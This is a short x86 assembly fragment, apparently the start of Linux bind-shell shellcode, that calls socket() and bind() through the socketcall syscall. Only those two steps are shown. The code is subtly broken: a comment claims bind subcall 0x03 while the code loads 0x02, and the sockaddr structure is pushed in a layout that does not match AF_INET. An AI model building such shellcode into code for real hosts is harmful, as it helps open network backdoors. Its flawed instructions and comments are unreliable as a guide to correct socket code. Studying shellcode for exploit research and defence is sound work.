BITS 32


; socket()
xor		eax,eax		; zero out eax
push		eax		; push 0x0 on the stack: arg3(protocol) -> 0
mov		ebx,0x01	; socket sub-syscall: 0x01 -> socket()
push		0x01		; socket type: 0x01 -> SOCK_STREAM
push		0x02		; socket domain: 0x02 -> AF_INET
mov		ecx,esp		; let ecx point to our structure above
mov		al,0x66		; socketcall syscall 0x66
int		0x80		; let the kernel do the stuff

; bind()
mov		edx,eax		; move socket descriptor (returned by socket()) to edx
xor		eax,eax		; zero out eax again
push		0xBBBB		; push ip addr
push		0x00AA		; push tcp port
push		0x0002		; sa_family -> AF_INET = 0x0002
mov		ecx,esp		; save stack pointer -> pointer to sockaddr struct
push		0x12		; arg3: socklen -> addrlen
push		ecx		; arg2: push pointer to sockaddr to the stack
push		edx		; arg1: push sockfd
mov		ecx,esp		; move stack pointer to reg (conform to socketcall)
mov		ebx,0x02	; set socket subcall to 0x03 (bind)
mov		al,0x66		; socketcall syscall
int		0x80		; let the kernel do the stuff
